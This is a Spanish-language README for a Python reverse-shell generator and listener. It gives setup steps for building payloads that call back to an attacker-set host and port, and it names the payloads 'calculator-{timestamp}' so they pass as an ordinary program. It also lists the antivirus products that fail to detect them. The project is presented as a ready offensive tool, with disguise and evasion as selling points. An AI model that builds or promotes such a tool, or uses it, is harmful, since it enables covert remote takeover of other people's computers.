# Reverse Shell

Proyecto que consiste en generar un payload de reverse shell en python, el cual se ejecuta en la máquina objetivo y se conecta a un servidor controlado por el atacante.

- [Reverse Shell](#reverse-shell)
  - [Requisitos](#requisitos)
  - [Instalación](#instalación)
  - [Uso](#uso)
  - [Comandos](#comandos)
  - [Ejemplos](#ejemplos)
  - [Pruebas realizadas en antivirus](#pruebas-realizadas-en-antivirus)
  - [Capturas](#capturas)

## Requisitos

- ![Static Badge](https://img.shields.io/badge/Python-^3.12-yellow?logo=python&logoColor=white)

## Instalación

Clona el repositorio

```bash
git clone https://github.com/epmyas2022/reverse_shell.git
```

Entra al directorio del proyecto

```bash
cd reverse_shell
```

Instala las dependencias

```bash
pip install -r requirements.txt
```

## Uso

```bash
python reverse_shell.py
```

## Comandos

- `help`: Muestra la lista de comandos disponibles.
- `generate`: Genera un payload de reverse shell en python.
- `execute`: Inicia un servidor que escucha las conexiones de los payloads generados.
- `set`: Establece el valor de una variable.
- `exit`: Salir del programa.

## Ejemplos

Generar un payload de reverse shell especificando la dirección IP y el puerto del servidor

El siguiente comando setea la direccion IP del payload:

```bash
set generate.lhost 10.0.0.20
```

El siguiente comando setea el puerto del payload:

```bash
set generate.lport 4444
```

El siguiente comando genera el payload:

```bash
generate
```

![Reverse Shell Generate Command](./images/payload.png)

Los payloads generados se guardan en la carpeta raíz del proyecto. con el siguiente nombre: `calculator-{timestamp}`

Iniciar el servidor que escucha las conexiones de los payloads generados

El siguiente comando setea el puerto del servidor:

```bash
set session.lport 4444
```

El siguient comando setea el host del servidor:

```bash
set session.lhost
```

El siguiente comando inicia el servidor:

```bash
execute
```

![Reverse Shell Execute Command](./images/execute.png)

Para detener la escucha del servidor, presiona `Ctrl + C`

Para salir de la sesión, ejecuta el comando `exit`

## Pruebas realizadas en antivirus

✅ = No detectado
❌ = Detectado

- Windows Defender [✅]
- Avast [❌]
- ESETNOD32 [✅]
- McAfee [✅]
- Bitdefender [✅]

## Capturas

![Reverse Shell](./images/image.png)
